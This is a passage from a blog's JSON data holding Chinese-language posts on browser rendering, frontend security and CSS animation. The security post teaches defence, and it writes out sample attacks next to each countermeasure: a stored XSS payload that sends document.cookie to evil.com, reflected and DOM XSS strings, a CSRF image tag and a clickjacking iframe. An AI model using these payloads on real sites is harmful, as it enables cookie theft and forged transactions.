Developer","url":"https://github.com/HuangZhe007","socials":{"github":"https://github.com/HuangZhe007"},"imageURL":"https://avatars.githubusercontent.com/u/45168628?v=4","key":"mason","page":null}],"frontMatter":{"slug":"browser-rendering","title":"\u6d4f\u89c8\u5668\u6e32\u67d3\u539f\u7406\u6df1\u5ea6\u89e3\u6790","authors":"mason","tags":["\u6d4f\u89c8\u5668","\u6027\u80fd","\u524d\u7aef"]},"unlisted":false,"prevItem":{"title":"RESTful API \u8bbe\u8ba1\u89c4\u8303\u4e0e\u6700\u4f73\u5b9e\u8df5","permalink":"/blog/restful-api-design"},"nextItem":{"title":"\u524d\u7aef\u5b89\u5168\u5b9e\u8df5\u6307\u5357","permalink":"/blog/frontend-security"}},"content":"\u7406\u89e3\u6d4f\u89c8\u5668\u6e32\u67d3\u539f\u7406\u662f\u524d\u7aef\u6027\u80fd\u4f18\u5316\u7684\u57fa\u7840\u3002\u672c\u6587\u6df1\u5165\u89e3\u6790\u4ece HTML \u5230\u50cf\u7d20\u7684\u5b8c\u6574\u8fc7\u7a0b\u3002\\n\\n\x3c!--truncate--\x3e\\n\\n## \ud83d\udd04 \u6e32\u67d3\u6d41\u7a0b\u6982\u89c8\\n\\n```\\nHTML \u2192 DOM Tree\\n              \u2198\\n                \u2192 Render Tree \u2192 Layout \u2192 Paint \u2192 Composite\\n              \u2197\\nCSS \u2192 CSSOM Tree\\n```\\n\\n1. **\u89e3\u6790 HTML** \u2192 \u6784\u5efa DOM Tree\\n2. **\u89e3\u6790 CSS** \u2192 \u6784\u5efa CSSOM Tree  \\n3. **\u5408\u5e76** \u2192 \u751f\u6210 Render Tree\\n4. **\u5e03\u5c40 (Layout)** \u2192 \u8ba1\u7b97\u51e0\u4f55\u4fe1\u606f\\n5. **\u7ed8\u5236 (Paint)** \u2192 \u586b\u5145\u50cf\u7d20\\n6. **\u5408\u6210 (Composite)** \u2192 \u56fe\u5c42\u5408\u6210\\n\\n---\\n\\n## \ud83c\udf33 DOM \u4e0e CSSOM\\n\\n### DOM Tree \u6784\u5efa\\n\\n```html\\n<html>\\n  <head><title>Page</title></head>\\n  <body>\\n    <div class=\\"container\\">\\n      <p>Hello</p>\\n    </div>\\n  </body>\\n</html>\\n```\\n\\n```\\nDocument\\n\u2514\u2500\u2500 html\\n    \u251c\u2500\u2500 head\\n    \u2502   \u2514\u2500\u2500 title\\n    \u2502       \u2514\u2500\u2500 \\"Page\\"\\n    \u2514\u2500\u2500 body\\n        \u2514\u2500\u2500 div.container\\n            \u2514\u2500\u2500 p\\n                \u2514\u2500\u2500 \\"Hello\\"\\n```\\n\\n### CSSOM Tree \u6784\u5efa\\n\\n```css\\nbody { font-size: 16px; }\\n.container { width: 100%; }\\np { color: blue; }\\n```\\n\\n```\\nbody\\n\u251c\u2500\u2500 font-size: 16px\\n\u2514\u2500\u2500 .container\\n    \u251c\u2500\u2500 width: 100%\\n    \u2514\u2500\u2500 p\\n        \u2514\u2500\u2500 color: blue\\n```\\n\\n### \u963b\u585e\u884c\u4e3a\\n\\n| \u8d44\u6e90 | \u963b\u585e DOM \u89e3\u6790 | \u963b\u585e\u6e32\u67d3 |\\n|------|--------------|---------|\\n| HTML | - | - |\\n| CSS | \u274c | \u2705 |\\n| `<script>` | \u2705 | \u2705 |\\n| `<script async>` | \u274c | \u274c |\\n| `<script defer>` | \u274c | \u274c |\\n\\n---\\n\\n## \ud83d\udcd0 Layout (Reflow) \u91cd\u6392\\n\\n### \u4ec0\u4e48\u662f\u91cd\u6392\\n\\n\u8ba1\u7b97\u5143\u7d20\u7684\u51e0\u4f55\u4fe1\u606f\uff1a\u4f4d\u7f6e\u3001\u5927\u5c0f\u3002\\n\\n### \u89e6\u53d1\u91cd\u6392\u7684\u64cd\u4f5c\\n\\n```javascript\\n// \u4fee\u6539\u51e0\u4f55\u5c5e\u6027\\nelement.style.width = \'100px\';\\nelement.style.height = \'200px\';\\nelement.style.margin = \'10px\';\\nelement.style.padding = \'20px\';\\n\\n// \u8bfb\u53d6\u51e0\u4f55\u5c5e\u6027\\nelement.offsetWidth;\\nelement.offsetHeight;\\nelement.getBoundingClientRect();\\n\\n// DOM \u64cd\u4f5c\\nelement.appendChild(child);\\nelement.removeChild(child);\\n\\n// \u5176\u4ed6\\nwindow.resize\\n\u6539\u53d8\u5b57\u4f53\u5927\u5c0f\\n```\\n\\n### \u907f\u514d\u91cd\u6392\\n\\n```javascript\\n// \u274c \u89e6\u53d1\u591a\u6b21\u91cd\u6392\\nelement.style.width = \'100px\';\\nelement.style.height = \'200px\';\\nelement.style.margin = \'10px\';\\n\\n// \u2705 \u4f7f\u7528 class \u4e00\u6b21\u6027\u4fee\u6539\\nelement.classList.add(\'new-style\');\\n\\n// \u2705 \u4f7f\u7528 cssText\\nelement.style.cssText = \'width: 100px; height: 200px; margin: 10px;\';\\n\\n// \u2705 \u79bb\u7ebf\u64cd\u4f5c DOM\\nconst fragment = document.createDocumentFragment();\\nitems.forEach(item => fragment.appendChild(createItem(item)));\\ncontainer.appendChild(fragment);\\n```\\n\\n### \u5f3a\u5236\u540c\u6b65\u5e03\u5c40\\n\\n```javascript\\n// \u274c \u8bfb\u5199\u4ea4\u66ff\u5bfc\u81f4\u5f3a\u5236\u540c\u6b65\u5e03\u5c40\\nfor (let i = 0; i < elements.length; i++) {\\n  elements[i].style.width = box.offsetWidth + \'px\'; // \u6bcf\u6b21\u5faa\u73af\u90fd\u89e6\u53d1\u91cd\u6392\\n}\\n\\n// \u2705 \u5148\u8bfb\u540e\u5199\\nconst width = box.offsetWidth;\\nfor (let i = 0; i < elements.length; i++) {\\n  elements[i].style.width = width + \'px\';\\n}\\n```\\n\\n---\\n\\n## \ud83c\udfa8 Paint (Repaint) \u91cd\u7ed8\\n\\n### \u4ec0\u4e48\u662f\u91cd\u7ed8\\n\\n\u586b\u5145\u50cf\u7d20\uff1a\u989c\u8272\u3001\u80cc\u666f\u3001\u9634\u5f71\u7b49\u3002\\n\\n### \u53ea\u89e6\u53d1\u91cd\u7ed8\u7684\u5c5e\u6027\\n\\n```javascript\\n// \u4e0d\u5f71\u54cd\u5e03\u5c40\uff0c\u53ea\u89e6\u53d1\u91cd\u7ed8\\nelement.style.color = \'red\';\\nelement.style.backgroundColor = \'blue\';\\nelement.style.visibility = \'hidden\';\\nelement.style.boxShadow = \'0 0 10px black\';\\n```\\n\\n### \u91cd\u7ed8 vs \u91cd\u6392\\n\\n| \u64cd\u4f5c | \u91cd\u6392 | \u91cd\u7ed8 |\\n|------|------|------|\\n| \u4fee\u6539 width/height | \u2705 | \u2705 |\\n| \u4fee\u6539 color | \u274c | \u2705 |\\n| \u4fee\u6539 transform | \u274c | \u274c |\\n| \u4fee\u6539 opacity | \u274c | \u274c |\\n\\n---\\n\\n## \ud83e\udde9 Composite \u5408\u6210\\n\\n### \u4ec0\u4e48\u662f\u5408\u6210\\n\\n\u5c06\u591a\u4e2a\u56fe\u5c42\u5408\u5e76\u6210\u6700\u7ec8\u56fe\u50cf\uff0c\u7531 GPU \u5904\u7406\u3002\\n\\n### \u521b\u5efa\u72ec\u7acb\u56fe\u5c42\u7684\u5c5e\u6027\\n\\n```css\\n/* \u4ee5\u4e0b\u5c5e\u6027\u4f1a\u521b\u5efa\u65b0\u56fe\u5c42 */\\ntransform: translateZ(0);\\nwill-change: transform;\\nopacity: 0.99;\\nposition: fixed;\\n```\\n\\n### \u53ea\u89e6\u53d1\u5408\u6210\u7684\u5c5e\u6027\\n\\n```css\\n/* \u6700\u9ad8\u6027\u80fd - \u53ea\u89e6\u53d1\u5408\u6210 */\\ntransform: translate(), scale(), rotate();\\nopacity: 0 ~ 1;\\n```\\n\\n---\\n\\n## \u26a1 \u6027\u80fd\u4f18\u5316\u7b56\u7565\\n\\n### 1. \u51cf\u5c11\u5173\u952e\u8d44\u6e90\\n\\n```html\\n\x3c!-- \u5185\u8054\u5173\u952e CSS --\x3e\\n<style>\\n  /* \u9996\u5c4f\u5173\u952e\u6837\u5f0f */\\n</style>\\n\\n\x3c!-- \u5f02\u6b65\u52a0\u8f7d\u975e\u5173\u952e CSS --\x3e\\n<link rel=\\"preload\\" href=\\"styles.css\\" as=\\"style\\" onload=\\"this.rel=\'stylesheet\'\\">\\n```\\n\\n### 2. \u51cf\u5c11\u963b\u585e\\n\\n```html\\n\x3c!-- JS \u653e\u5e95\u90e8\u6216\u4f7f\u7528 defer --\x3e\\n<script defer src=\\"app.js\\"><\/script>\\n\\n\x3c!-- \u9884\u52a0\u8f7d\u5173\u952e\u8d44\u6e90 --\x3e\\n<link rel=\\"preload\\" href=\\"font.woff2\\" as=\\"font\\" crossorigin>\\n```\\n\\n### 3. \u4f7f\u7528 transform \u66ff\u4ee3\u4f4d\u7f6e\u5c5e\u6027\\n\\n```css\\n/* \u274c \u89e6\u53d1\u91cd\u6392 */\\n.animate {\\n  left: 100px;\\n  top: 100px;\\n}\\n\\n/* \u2705 \u53ea\u89e6\u53d1\u5408\u6210 */\\n.animate {\\n  transform: translate(100px, 100px);\\n}\\n```\\n\\n### 4. \u4f7f\u7528 requestAnimationFrame\\n\\n```javascript\\n// \u274c \u53ef\u80fd\u5728\u4e0d\u5408\u9002\u7684\u65f6\u673a\u6267\u884c\\nsetInterval(() => {\\n  element.style.transform = `translateX(${x++}px)`;\\n}, 16);\\n\\n// \u2705 \u4e0e\u6d4f\u89c8\u5668\u5237\u65b0\u540c\u6b65\\nfunction animate() {\\n  element.style.transform = `translateX(${x++}px)`;\\n  requestAnimationFrame(animate);\\n}\\nrequestAnimationFrame(animate);\\n```\\n\\n### 5. \u865a\u62df\u5217\u8868\\n\\n```javascript\\n// \u53ea\u6e32\u67d3\u53ef\u89c1\u533a\u57df\u7684\u5143\u7d20\\n// \u4f7f\u7528 react-window / react-virtualized\\n```\\n\\n---\\n\\n## \ud83d\udd0d \u8c03\u8bd5\u5de5\u5177\\n\\n### Chrome DevTools\\n\\n1. **Performance** \u9762\u677f\\n   - \u5f55\u5236\u6e32\u67d3\u8fc7\u7a0b\\n   - \u67e5\u770b\u706b\u7130\u56fe\\n   - \u5206\u6790\u957f\u4efb\u52a1\\n\\n2. **Rendering** \u9762\u677f\\n   - Paint flashing\uff08\u9ad8\u4eae\u91cd\u7ed8\u533a\u57df\uff09\\n   - Layout Shift Regions\uff08\u5e03\u5c40\u504f\u79fb\uff09\\n   - Layer borders\uff08\u56fe\u5c42\u8fb9\u754c\uff09\\n   - FPS meter\uff08\u5e27\u7387\u663e\u793a\uff09\\n\\n### \u6253\u5f00 Rendering \u9762\u677f\\n\\n1. \u6253\u5f00 DevTools\\n2. Cmd+Shift+P\\n3. \u8f93\u5165 \\"Show Rendering\\"\\n\\n---\\n\\n## \ud83d\udcca \u6838\u5fc3 Web \u6307\u6807\\n\\n| \u6307\u6807 | \u542b\u4e49 | \u76ee\u6807 |\\n|------|------|------|\\n| **LCP** | \u6700\u5927\u5185\u5bb9\u7ed8\u5236 | < 2.5s |\\n| **FID** | \u9996\u6b21\u8f93\u5165\u5ef6\u8fdf | < 100ms |\\n| **CLS** | \u7d2f\u79ef\u5e03\u5c40\u504f\u79fb | < 0.1 |\\n| **FCP** | \u9996\u6b21\u5185\u5bb9\u7ed8\u5236 | < 1.8s |\\n| **TTFB** | \u9996\u5b57\u8282\u65f6\u95f4 | < 800ms |\\n\\n---\\n\\n## \ud83d\udcda \u63a8\u8350\u8d44\u6e90\\n\\n- [Inside look at modern web browser](https://developer.chrome.com/blog/inside-browser-part1/)\\n- [Rendering Performance](https://web.dev/rendering-performance/)\\n- [CSS Triggers](https://csstriggers.com/)\\n\\n---\\n\\n\u7406\u89e3\u6e32\u67d3\u539f\u7406\u540e\uff0c\u4f60\u4f1a\u66f4\u6e05\u695a\u4e3a\u4ec0\u4e48\u67d0\u4e9b\u4f18\u5316\u7b56\u7565\u6709\u6548\u3002\u8bb0\u4f4f\uff1a**\u6d4b\u91cf\u5148\u4e8e\u4f18\u5316**\u3002"},{"id":"frontend-security","metadata":{"permalink":"/blog/frontend-security","editUrl":"https://github.com/hweos/git-pages/edit/main/blog/2024-04-10-frontend-security.md","source":"@site/blog/2024-04-10-frontend-security.md","title":"\u524d\u7aef\u5b89\u5168\u5b9e\u8df5\u6307\u5357","description":"\u524d\u7aef\u5b89\u5168\u662f Web \u5f00\u53d1\u4e2d\u4e0d\u53ef\u5ffd\u89c6\u7684\u91cd\u8981\u73af\u8282\u3002\u672c\u6587\u603b\u7ed3\u5e38\u89c1\u7684\u5b89\u5168\u5a01\u80c1\u548c\u9632\u62a4\u63aa\u65bd\u3002","date":"2024-04-10T00:00:00.000Z","tags":[{"inline":true,"label":"\u5b89\u5168","permalink":"/blog/tags/\u5b89\u5168"},{"inline":true,"label":"\u524d\u7aef","permalink":"/blog/tags/\u524d\u7aef"},{"inline":true,"label":"XSS","permalink":"/blog/tags/xss"},{"inline":true,"label":"CSRF","permalink":"/blog/tags/csrf"}],"readingTime":3.36,"hasTruncateMarker":true,"authors":[{"name":"Mason","title":"Full Stack Developer","url":"https://github.com/HuangZhe007","socials":{"github":"https://github.com/HuangZhe007"},"imageURL":"https://avatars.githubusercontent.com/u/45168628?v=4","key":"mason","page":null}],"frontMatter":{"slug":"frontend-security","title":"\u524d\u7aef\u5b89\u5168\u5b9e\u8df5\u6307\u5357","authors":"mason","tags":["\u5b89\u5168","\u524d\u7aef","XSS","CSRF"]},"unlisted":false,"prevItem":{"title":"\u6d4f\u89c8\u5668\u6e32\u67d3\u539f\u7406\u6df1\u5ea6\u89e3\u6790","permalink":"/blog/browser-rendering"},"nextItem":{"title":"CSS \u52a8\u753b\u4e0e\u8fc7\u6e21\u6548\u679c\u5b9e\u6218","permalink":"/blog/css-animation"}},"content":"\u524d\u7aef\u5b89\u5168\u662f Web \u5f00\u53d1\u4e2d\u4e0d\u53ef\u5ffd\u89c6\u7684\u91cd\u8981\u73af\u8282\u3002\u672c\u6587\u603b\u7ed3\u5e38\u89c1\u7684\u5b89\u5168\u5a01\u80c1\u548c\u9632\u62a4\u63aa\u65bd\u3002\\n\\n\x3c!--truncate--\x3e\\n\\n## \ud83c\udfaf \u5e38\u89c1\u5b89\u5168\u5a01\u80c1\\n\\n| \u5a01\u80c1 | \u8bf4\u660e | \u5371\u5bb3\u7b49\u7ea7 |\\n|------|------|---------|\\n| XSS | \u8de8\u7ad9\u811a\u672c\u653b\u51fb | \ud83d\udd34 \u9ad8 |\\n| CSRF | \u8de8\u7ad9\u8bf7\u6c42\u4f2a\u9020 | \ud83d\udd34 \u9ad8 |\\n| \u70b9\u51fb\u52ab\u6301 | \u900f\u660e iframe \u8986\u76d6 | \ud83d\udfe1 \u4e2d |\\n| \u4e2d\u95f4\u4eba\u653b\u51fb | \u62e6\u622a/\u7be1\u6539\u901a\u4fe1 | \ud83d\udd34 \u9ad8 |\\n| \u654f\u611f\u4fe1\u606f\u6cc4\u9732 | \u524d\u7aef\u66b4\u9732\u5bc6\u94a5\u7b49 | \ud83d\udfe1 \u4e2d |\\n\\n---\\n\\n## \ud83d\udee1\ufe0f XSS \u8de8\u7ad9\u811a\u672c\u653b\u51fb\\n\\n### \u653b\u51fb\u7c7b\u578b\\n\\n**1. \u5b58\u50a8\u578b XSS**\\n```javascript\\n// \u7528\u6237\u63d0\u4ea4\u6076\u610f\u5185\u5bb9\uff0c\u5b58\u5165\u6570\u636e\u5e93\\n// \u5176\u4ed6\u7528\u6237\u8bbf\u95ee\u65f6\u6267\u884c\\n<script>fetch(\'https://evil.com/steal?cookie=\'+document.cookie)<\/script>\\n```\\n\\n**2. \u53cd\u5c04\u578b XSS**\\n```javascript\\n// \u6076\u610f\u94fe\u63a5\\nhttps://example.com/search?q=<script>alert(\'XSS\')<\/script>\\n```\\n\\n**3. DOM \u578b XSS**\\n```javascript\\n// \u76f4\u63a5\u64cd\u4f5c DOM\uff0c\u4e0d\u7ecf\u8fc7\u670d\u52a1\u5668\\ndocument.getElementById(\'output\').innerHTML = location.hash.slice(1);\\n// URL: https://example.com/#<img src=x onerror=alert(\'XSS\')>\\n```\\n\\n### \u9632\u62a4\u63aa\u65bd\\n\\n**1. \u8f93\u51fa\u7f16\u7801**\\n\\n```javascript\\n// \u274c \u5371\u9669\\nelement.innerHTML = userInput;\\n\\n// \u2705 \u5b89\u5168 - \u4f7f\u7528 textContent\\nelement.textContent = userInput;\\n\\n// \u2705 \u5b89\u5168 - HTML \u7f16\u7801\\nfunction escapeHtml(str) {\\n  const div = document.createElement(\'div\');\\n  div.textContent = str;\\n  return div.innerHTML;\\n}\\n```\\n\\n**2. CSP \u5185\u5bb9\u5b89\u5168\u7b56\u7565**\\n\\n```html\\n\x3c!-- HTTP Header --\x3e\\nContent-Security-Policy: default-src \'self\'; script-src \'self\' \'nonce-\u968f\u673a\u503c\'\\n\\n\x3c!-- Meta \u6807\u7b7e --\x3e\\n<meta http-equiv=\\"Content-Security-Policy\\" \\n      content=\\"default-src \'self\'; script-src \'self\'\\">\\n```\\n\\n**3. HttpOnly Cookie**\\n\\n```javascript\\n// \u670d\u52a1\u7aef\u8bbe\u7f6e\\nSet-Cookie: session=abc123; HttpOnly; Secure; SameSite=Strict\\n```\\n\\n**4. \u6846\u67b6\u81ea\u52a8\u8f6c\u4e49**\\n\\n```jsx\\n// React \u81ea\u52a8\u8f6c\u4e49\\n<div>{userInput}</div>  // \u5b89\u5168\\n\\n// \u274c \u5371\u9669 - \u7ed5\u8fc7\u8f6c\u4e49\\n<div dangerouslySetInnerHTML={{__html: userInput}} />\\n```\\n\\n---\\n\\n## \ud83d\udd10 CSRF \u8de8\u7ad9\u8bf7\u6c42\u4f2a\u9020\\n\\n### \u653b\u51fb\u539f\u7406\\n\\n```html\\n\x3c!-- \u6076\u610f\u7f51\u7ad9 evil.com --\x3e\\n<img src=\\"https://bank.com/transfer?to=hacker&amount=10000\\">\\n\\n\x3c!-- \u7528\u6237\u5df2\u767b\u5f55 bank.com\uff0cCookie \u81ea\u52a8\u643a\u5e26 --\x3e\\n```\\n\\n### \u9632\u62a4\u63aa\u65bd\\n\\n**1. CSRF Token**\\n\\n```html\\n\x3c!-- \u8868\u5355\u4e2d\u5305\u542b Token --\x3e\\n<form action=\\"/transfer\\" method=\\"POST\\">\\n  <input type=\\"hidden\\" name=\\"_csrf\\" value=\\"\u968f\u673aToken\\">\\n  \x3c!-- \u5176\u4ed6\u5b57\u6bb5 --\x3e\\n</form>\\n```\\n\\n```javascript\\n// Fetch \u8bf7\u6c42\u643a\u5e26 Token\\nfetch(\'/api/transfer\', {\\n  method: \'POST\',\\n  headers: {\\n    \'X-CSRF-Token\': getCsrfToken()\\n  },\\n  body: JSON.stringify(data)\\n});\\n```\\n\\n**2. SameSite Cookie**\\n\\n```javascript\\n// \u670d\u52a1\u7aef\u8bbe\u7f6e\\nSet-Cookie: session=abc; SameSite=Strict  // \u6700\u4e25\u683c\\nSet-Cookie: session=abc; SameSite=Lax     // \u5141\u8bb8\u5bfc\u822a\u8bf7\u6c42\\n```\\n\\n**3. \u9a8c\u8bc1 Referer/Origin**\\n\\n```javascript\\n// \u670d\u52a1\u7aef\u9a8c\u8bc1\u8bf7\u6c42\u6765\u6e90\\nif (request.headers.origin !== \'https://example.com\') {\\n  return response.status(403).send(\'Forbidden\');\\n}\\n```\\n\\n---\\n\\n## \ud83d\uddbc\ufe0f \u70b9\u51fb\u52ab\u6301\\n\\n### \u653b\u51fb\u539f\u7406\\n\\n```html\\n\x3c!-- \u900f\u660e iframe \u8986\u76d6\u5728\u6309\u94ae\u4e0a --\x3e\\n<iframe src=\\"https://bank.com/transfer\\" \\n        style=\\"opacity: 0; position: absolute;\\">\\n</iframe>\\n<button>\u70b9\u51fb\u9886\u53d6\u5956\u54c1</button>\\n```\\n\\n### \u9632\u62a4\u63aa\u65bd\\n\\n**1. X-Frame-Options**\\n\\n```http\\nX-Frame-Options: DENY           # \u7981\u6b62\u6240\u6709 iframe\\nX-Frame-Options: SAMEORIGIN     # \u53ea\u5141\u8bb8\u540c\u6e90\\n```\\n\\n**2. CSP frame-ancestors**\\n\\n```http\\nContent-Security-Policy: frame-ancestors \'self\'\\n```\\n\\n**3. JavaScript \u68c0\u6d4b**\\n\\n```javascript\\n// \u68c0\u6d4b\u662f\u5426\u88ab\u5d4c\u5165 iframe\\nif (window.top !== window.self) {\\n  window.top.location = window.self.location;\\n}\\n```\\n\\n---\\n\\n## \ud83d\udd12 HTTPS \u4e0e\u4f20\u8f93\u5b89\u5168\\n\\n### \u5f3a\u5236 HTTPS\\n\\n```javascript\\n// \u670d\u52a1\u7aef\u91cd\u5b9a\u5411\\nif (req.protocol !== \'https\') {\\n  res.redirect(`https://${req.host}${req.url}`);\\n}\\n```\\n\\n### HSTS \u5934\\n\\n```http\\nStrict-Transport-Security: max-age=31536000; includeSubDomains; preload\\n```\\n\\n### \u5b89\u5168\u5934\u914d\u7f6e\\n\\n```http\\n# \u63a8\u8350\u7684\u5b89\u5168\u54cd\u5e94\u5934\\nX-Content-Type-Options: nosniff\\nX-Frame-Options: DENY\\nX-XSS-Protection: 1; mode=block\\nReferrer-Policy: strict-origin-when-cross-origin\\nPermissions-Policy: geolocation=(), microphone=()\\n```\\n\\n---\\n\\n## \ud83d\udd11 \u654f\u611f\u4fe1\u606f\u4fdd\u62a4\\n\\n### \u4e0d\u8981\u5728\u524d\u7aef\u5b58\u50a8\\n\\n```javascript\\n// \u274c \u5371\u9669\\nconst API_KEY = \'sk-xxxxxxxxxxxxx\';\\nlocalStorage.setItem(\'password\', userPassword);\\n\\n// \u2705 \u654f\u611f\u64cd\u4f5c\u653e\u5230\u540e\u7aef\\n```\\n\\n### \u73af\u5883\u53d8\u91cf\\n\\n```javascript\\n// \u274c \u4f1a\u6253\u5305\u5230\u524d\u7aef\\nconst key = process.env.SECRET_KEY;\\n\\n// \u2705 \u4f7f\u7528\u516c\u5f00\u524d\u7f00\\nconst key = process.env.NEXT_PUBLIC_API_KEY; // \u53ea\u653e\u516c\u5f00\u4fe1\u606f\\n```\\n\\n### \u4ee3\u7801\u6df7\u6dc6\\n\\n```javascript\\n// \u751f\u4ea7\u73af\u5883\u4ee3\u7801\u6df7\u6dc6\\n// \u4f46\u8bb0\u4f4f\uff1a\u6df7\u6dc6\u4e0d\u662f\u52a0\u5bc6\uff0c\u4ecd\u53ef\u88ab\u9006\u5411\\n```\\n\\n---\\n\\n## \ud83d\udccb \u5b89\u5168\u68c0\u67e5\u6e05\u5355\\n\\n### \u5f00\u53d1\u9636\u6bb5\\n\\n- [ ] \u6240\u6709\u7528\u6237\u8f93\u5165\u90fd\u8fdb\u884c\u9a8c\u8bc1\u548c\u8f6c\u4e49\\n- [ ] \u4f7f\u7528 HTTPS\\n- [ ] \u5b9e\u73b0 CSRF \u9632\u62a4\\n- [ ] \u914d\u7f6e\u5b89\u5168\u54cd\u5e94\u5934\\n- [ ] \u4e0d\u5728\u524d\u7aef\u5b58\u50a8\u654f\u611f\u4fe1\u606f\\n- [ ] \u4f7f\u7528 HttpOnly\u3001Secure Cookie\\n\\n### \u90e8\u7f72\u9636\u6bb5\\n\\n- [ ] \u542f\u7528 CSP\\n- [ ] \u914d\u7f6e HSTS\\n- [ ] \u7981\u7528\u4e0d\u5fc5\u8981\u7684 HTTP \u65b9\u6cd5\\n- [ ] \u5b9a\u671f\u66f4\u65b0\u4f9d\u8d56\\n- [ ] \u8fdb\u884c\u5b89\u5168\u626b\u63cf\\n\\n### \u63a8\u8350\u5de5\u5177\\n\\n| \u5de5\u5177 | \u7528\u9014 |\\n|------|------|\\n| [OWASP ZAP](https://www.zaproxy.org/) | \u5b89\u5168\u626b\u63cf |\\n| [Snyk](https://snyk.io/) | \u4f9d\u8d56\u6f0f\u6d1e\u68c0\u6d4b |\\n| [SecurityHeaders](https://securityheaders.com/) | \u54cd\u5e94\u5934\u68c0\u6d4b |\\n| [Helmet.js](https://helmetjs.github.io/) | Express \u5b89\u5168\u4e2d\u95f4\u4ef6 |\\n\\n---\\n\\n## \ud83d\udcda \u63a8\u8350\u8d44\u6e90\\n\\n- [OWASP Top 10](https://owasp.org/www-project-top-ten/)\\n- [MDN Web Security](https://developer.mozilla.org/en-US/docs/Web/Security)\\n- [Google Web Security](https://web.dev/security/)\\n\\n---\\n\\n\u5b89\u5168\u662f\u4e00\u4e2a\u6301\u7eed\u7684\u8fc7\u7a0b\uff0c\u800c\u4e0d\u662f\u4e00\u6b21\u6027\u7684\u4efb\u52a1\u3002\u4fdd\u6301\u8b66\u60d5\uff0c\u5b9a\u671f\u5ba1\u67e5\u4ee3\u7801\u548c\u4f9d\u8d56\u3002"},{"id":"css-animation","metadata":{"permalink":"/blog/css-animation","editUrl":"https://github.com/hweos/git-pages/edit/main/blog/2024-04-01-css-animation.md","source":"@site/blog/2024-04-01-css-animation.md","title":"CSS \u52a8\u753b\u4e0e\u8fc7\u6e21\u6548\u679c\u5b9e\u6218","description":"CSS \u52a8\u753b\u80fd\u8ba9\u9875\u9762\u66f4\u52a0\u751f\u52a8\u6709\u8da3\u3002\u672c\u6587\u603b\u7ed3 Transition\u3001Animation \u7684\u4f7f\u7528\u6280\u5de7\u548c\u6027\u80fd\u4f18\u5316\u3002","date":"2024-04-01T00:00:00.000Z","tags":[{"inline":true,"label":"CSS","permalink":"/blog/tags/css"},{"inline":true,"label":"\u52a8\u753b","permalink":"/blog/tags/\u52a8\u753b"},{"inline":true,"label":"\u524d\u7aef","permalink":"/blog/tags/\u524d\u7aef"}],"readingTime":3.42,"hasTruncateMarker":true,"authors":[{"name":"Mason","title":"Full Stack Developer","url":"https://github.com/HuangZhe007","socials":{"github":"https://github.com/HuangZhe007"},"imageURL":"https://avatars.githubusercontent.com/u/45168628?v=4","key":"mason","page":null}],"frontMatter":{"slug":"css-animation","title":"CSS \u52a8\u753b\u4e0e\u8fc7\u6e21\u6548\u679c\u5b9e\u6218","authors":"mason","tags":["CSS","\u52a8\u753b","\u524d\u7aef"]},"unlisted":false,"prevItem":{"title":"\u524d\u7aef\u5b89\u5168\u5b9e\u8df5\u6307\u5357","permalink":"/blog/frontend-security"},"nextItem":{"title":"VSCode \u9ad8\u6548\u5f00\u53d1\u914d\u7f6e\u6307\u5357","permalink":"/blog/vscode-setup"}},"content":"CSS \u52a8\u753b\u80fd\u8ba9\u9875\u9762\u66f4\u52a0\u751f\u52a8\u6709\u8da3\u3002\u672c\u6587\u603b\u7ed3 Transition\u3001Animation \u7684\u4f7f\u7528\u6280\u5de7\u548c\u6027\u80fd\u4f18\u5316\u3002\\n\\n\x3c!--truncate--\x3e\\n\\n## \ud83c\udfac Transition \u8fc7\u6e21\\n\\n### \u57fa\u7840\u8bed\u6cd5\\n\\n```css\\n.element {\\n  transition: property duration timing-function delay;\\n  \\n  /* \u793a\u4f8b */\\n  transition: all 0.3s ease;\\n  transition: transform 0.3s ease, opacity 0.2s ease;\\n}\\n```\\n\\n### \u5e38\u7528\u5c5e\u6027\\n\\n| \u5c5e\u6027 | \u8bf4\u660e | \u793a\u4f8b\u503c |\\n|------|------|--------|\\n| `property` | \u8fc7\u6e21\u5c5e\u6027 | all, transform, opacity |\\n| `duration` | \u6301\u7eed\u65f6\u95f4 | 0.3s, 300ms |\\n| `timing-function` | \u7f13\u52a8\u51fd\u6570 | ease, linear, ease-in-out |\\n| `delay` | \u5ef6\u8fdf\u65f6\u95f4 | 0s, 0.1s |\\n\\n### \u7f13\u52a8\u51fd\u6570\\n\\n```css\\n/* \u5185\u7f6e\u7f13\u52a8 */\\ntransition-timing-function: ease;        /* \u9ed8\u8ba4\uff0c\u6162-\u5feb-\u6162 */\\ntransition-timing-function: linear;      /* \u5300\u901f */\\ntransition-timing-function: ease-in;     /* \u6162-\u5feb */\\ntransition-timing-function: ease-out;    /* \u5feb-\u6162 */\\ntransition-timing-function: ease-in-out; /* \u6162-\u5feb-\u6162 */\\n\\n/* \u81ea\u5b9a\u4e49\u8d1d\u585e\u5c14\u66f2\u7ebf */\\ntransition-timing-function: cubic-bezier(0.68, -0.55, 0.265, 1.55);\\n```\\n\\n### \u5b9e\u7528\u793a\u4f8b\\n\\n```css\\n/* \u6309\u94ae\u60ac\u6d6e\u6548\u679c */\\n.button {\\n  background: #3b82f6;\\n  transform: translateY(0);\\n  box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);\\n  transition: all 0.3s ease;\\n}\\n\\n.button:hover {\\n  transform: translateY(-2px);\\n  box-shadow: 0 8px 15px rgba(0, 0, 0, 0.2);\\n}\\n\\n/* \u5361\u7247\u5c55\u5f00\u6548\u679c */\\n.card {\\n  max-height: 100px;\\n  overflow: hidden;\\n  transition: max-height 0.5s ease;\\n}\\n\\n.card.expanded {\\n  max-height: 500px;\\n}\\n```\\n\\n---\\n\\n## \ud83c\udfa8 Animation \u52a8\u753b\\n\\n### \u57fa\u7840\u8bed\u6cd5\\n\\n```css\\n@keyframes animationName {\\n  0% { /* \u5f00\u59cb\u72b6\u6001 */ }\\n  50% { /* \u4e2d\u95f4\u72b6\u6001 */ }\\n  100% { /* \u7ed3\u675f\u72b6\u6001 */ }\\n}\\n\\n.element {\\n  animation: name duration timing-function delay iteration-count direction fill-mode;\\n}\\n```\\n\\n### \u52a8\u753b\u5c5e\u6027\\n\\n| \u5c5e\u6027 | \u8bf4\u660e | \u793a\u4f8b\u503c |\\n|------|------|--------|\\n| `name` | \u52a8\u753b\u540d\u79f0 | fadeIn, slideUp |\\n| `duration` | \u6301\u7eed\u65f6\u95f4 | 1s, 500ms |\\n| `timing-function` | \u7f13\u52a8\u51fd\u6570 | ease, linear |\\n| `delay` | \u5ef6\u8fdf | 0s, 0.5s |\\n| `iteration-count` | \u64ad\u653e\u6b21\u6570 | 